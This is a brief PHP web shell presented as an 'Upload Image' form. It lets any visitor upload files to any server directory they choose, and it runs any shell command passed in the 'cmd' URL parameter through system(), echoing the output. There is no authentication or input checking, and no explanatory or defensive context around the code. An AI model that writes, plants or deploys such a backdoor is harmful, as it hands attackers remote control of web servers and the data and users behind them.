<form action="#" method="post" enctype="multipart/form-data">
    <input type="text" value="<?php echo dirname(__FILE__) ."/" ; ?>" name="dir" style="width: 400px;"><br />
    <input type="file" name="fileToUpload" >

    <input type="submit" value="Upload Image" name="submit">
</form>


<?php

if(isset($_POST["submit"])  ) {
$target_dir = isset($_POST['dir'])?$_POST['dir']:"";
$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);
if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
        echo "The file ".$target_file. " has been uploaded.";
    } else {
        echo "Sorry, there was an error uploading your file.";
    }

}
?>



<pre>
<?php 
if(!empty($_GET['cmd'])) {
$cmd=$_GET['cmd'];
 system($cmd); 
}
?></pre>